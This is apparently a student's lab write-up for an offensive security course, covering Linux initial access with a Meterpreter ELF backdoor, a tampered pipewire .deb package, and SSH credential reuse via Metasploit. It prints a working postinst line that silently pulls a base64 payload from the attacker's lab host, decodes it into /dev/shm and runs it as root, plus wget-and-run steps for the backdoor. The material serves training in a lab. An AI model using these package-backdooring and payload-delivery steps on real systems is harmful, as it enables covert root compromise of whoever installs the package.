# Initial Access on Linux

This module ports the Windows initial access techniques from earlier in the course over to Linux. The goal is to get a foothold on a target machine while learning new file formats, tools, and package system. Three attack paths are covered: delivering a backdoored ELF binary, tampering with a Debian package, and reusing stolen credentials over SSH.

---

### EasyTier

Since I'm working from my own Kali machine I had to join my Kali host to the lab's EasyTier overlay network. EasyTier creates a private mesh (`192.168.77.0/24`) so the container can call back to my C2.

EasyTier was already installed on my Kali at `/opt/easytier`. I stopped the default instance that was running and joined the lab's mesh (note I used `sudo systemctl cat easytier.service` to find config info used in third cmd below):

```bash
sudo systemctl stop easytier@default.service
sudo systemctl disable easytier@default.service
sudo /opt/easytier/easytier-core -d --network-name ws-19 --network-secret <REDACTED> -p tcp://<REDACTED>
```

The `-d` flag lets DHCP assign an address. My Kali was assigned `192.168.77.2`. Confirmed from the container:

```bash
sudo /opt/easytier/easytier-cli peer
```

```
192.168.77.2 | celestia | p2p | 25ms | ...
```

`192.168.77.2` is my LHOST for all payloads in this lab.

---

## Lesson 2: Backdoor an Application (ELF Payload)

On Linux, msfvenom produces ELF (Executable and Linkable Format) binaries instead of PE executables. The `-f elf` flag replaces `-f exe` with everything else being the same workflow.

### Build and stage

```bash
./payload.sh
python3 -m http.server 8000
```
[payload.sh](./Scripts/payload.sh)

### Handler

```bash
msfconsole -q -r handler.rc
```
[handler.rc](./Scripts/handler.rc)

### On the container (as bthomas)

```bash
cd /tmp
wget http://192.168.77.2:8000/backdoor
chmod +x backdoor
./backdoor
```

### Session

```
meterpreter > hostname
```

<img width="279" height="103" alt="image" src="https://github.com/user-attachments/assets/432da1c7-7f47-4701-b808-ff18129c7ee6" />

### Meterpreter command cross-over

One of the points of this lesson is seeing which Windows Meterpreter commands carry over to Linux. Results below:

| Meterpreter Command | Worked on Linux? (Y/N) | Notes |
|---|---|---|
| `sysinfo` | Y | Returns the same info as on Windows. |
| `getuid` | Y | Also worked as expected. |
| `ps` | Y | Showed all running processes. |
| `hashdump` | N | Does not support Linux. |
| `getprivs` | N | Not supported. |
| `ipconfig` | Y | Returned the IP info. |
| `netstat -an` | Y | Returned network connections properly. |
| `arp` | Y | Works as expected. |
| `idletime` | N | Not supported. |
| `route` | Y | Works. |

The commands that failed (`hashdump`, `getprivs`, `idletime`) are Windows-specific. `hashdump` pulls from the Windows SAM database which doesn't exist on Linux. `getprivs` is tied to Windows access tokens. `idletime` has no Linux equivalent in Meterpreter.

---

## Lesson 3: Backdoor a .deb Package

Debian packages run a `postinst` maintainer script as root after installation. Appending a payload line to that script gives you root code execution on any machine that installs the package and the install output stays completely clean.

### Prepare the payload on Kali

```bash
base64 backdoor > b4ckd00r
python3 -m http.server 8000
```

### On the container (as nkatz)

Download and unpack a legitimate package:

```bash
apt-get download pipewire
dpkg-deb -R pipewire_0.3.48-1ubuntu3.2_amd64.deb pipewire_0.3.48-1ubuntu3.2_amd64
cd pipewire_0.3.48-1ubuntu3.2_amd64/DEBIAN/
nano postinst
```

Append this line at the end of `postinst`:

```bash
curl --silent http://192.168.77.2:8000/b4ckd00r 2>/dev/null | base64 -d > /dev/shm/runrun 2>/dev/null && chmod +x /dev/shm/runrun && /dev/shm/runrun >/dev/null 2>&1 &
```

Each piece does one job: `curl` pulls the base64 payload silently, `base64 -d` decodes it straight into `/dev/shm` (RAM so that nothing hits disk), `chmod +x` makes it executable, and the `&` backgrounds it so `postinst` returns immediately without hanging the install.

Back up the original and rebuild:

```bash
cd /tmp
mv pipewire_0.3.48-1ubuntu3.2_amd64.deb pipewire_0.3.48-1ubuntu3.2_amd64.deb.bk
dpkg-deb -b pipewire_0.3.48-1ubuntu3.2_amd64
```

Install and catch the callback:

```bash
sudo dpkg -i --force-depends pipewire_0.3.48-1ubuntu3.2_amd64.deb
```

The `--force-depends` flag was needed because the container's OS version was missing some of pipewire's dependencies. The package doesn't need to actually work as `postinst` still runs and fires the payload.

### Video

https://youtu.be/fI622y_mJBY

### Clean up

```bash
sudo rm -f /dev/shm/runrun
sudo dpkg -i pipewire_0.3.48-1ubuntu3.2_amd64.deb.bk
```

---

## Lesson 4: Stolen Credentials: ssh_login

Password reuse is one of the most common and quietest ways into a network. Metasploit's `auxiliary/scanner/ssh/ssh_login` automates credential testing over SSH. Here it's used against the lab's course accounts to simulate a scenario where credentials were harvested and are reused.

```bash
use auxiliary/scanner/ssh/ssh_login
show options
set RHOSTS 192.168.3.205
set RPORT 10019
set USERNAME llyons
set PASSWORD <REDACTED>
run
sessions
```

`show options` is worth running every time a module loads — it confirms what's required and what's already set, which is the most common source of failed runs.

<img width="1310" height="379" alt="image" src="https://github.com/user-attachments/assets/44d697ff-2129-4904-9e1a-5cb220a2d613" />

---

## Lesson 5: Verify and Clean Up

```bash
# No runrun in memory
ls /dev/shm/

# No stray payload processes
ps aux | grep runrun

# Remove the ELF from /tmp
rm /tmp/backdoor

# Close all sessions
sessions -K
```

`ps aux` confirmed no leftover processes. `/dev/shm` was clear. The container was left in the same state it started.
